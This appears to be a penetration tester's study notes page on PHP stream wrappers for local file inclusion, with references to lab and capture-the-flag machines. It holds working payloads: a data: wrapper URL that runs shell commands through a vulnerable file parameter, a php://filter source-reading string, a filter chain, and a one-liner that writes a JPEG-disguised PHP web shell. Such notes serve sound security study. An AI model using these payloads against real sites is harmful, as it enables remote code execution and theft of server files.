---
description: >-
  PHP Wrappers
title: PHP Wrappers              # Add title here
date: 2023-02-01 08:00:00 -0600                           # Change the date to match completion date
categories: [06 Exploitation, PHP Wrappers]                     # Change Templates to Writeup
tags: [exploitation, php, wrapper]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
## Wrappers
### data
Represent a string on the web page
```bash
http://10.11.0.22/menu.php?file=data:text/plain,hello world
```
![Description](/assets/img/Pasted image 20220905144914.png)
Shell with data
```
http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
```
![Description](/assets/img/Pasted image 20220905144942.png)
[[pain - 10.11.1.35#^f0daaa]]
### php://filter
Read file with base64 encode:
```php
php://filter/convert.base64-encode/resource=index.php
```
Examples:
[[StreamIO#^c6abe1]]
[[StreamIO#^56bdc2]]
[[StreamIO#^2912d9]]
[[StreamIO#^6f66d1]]

### Bypassing restrictions
Using magic number to bypass jpeg restriction:
```bash
printf '\xff\xd8\xff<?=`{$_GET["cmd"]}`;>' > sploit.php
```
Examples:
[ECHO CTF Cupidme](https://echoctf.red/target/33/writeup/read/7)

### PHP FILTER CHAIN GENERATOR
An excellent option to create a wrapper is by appending encoding wrappers for every character, this can be done with 
[php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator):

```bash
$ php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|/resource=php://temp');"
cwwwwcGyQpQw+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+AD0APQ-
```

### Common Attacks
![Description](/assets/img/Pasted image 20220811010103.png)

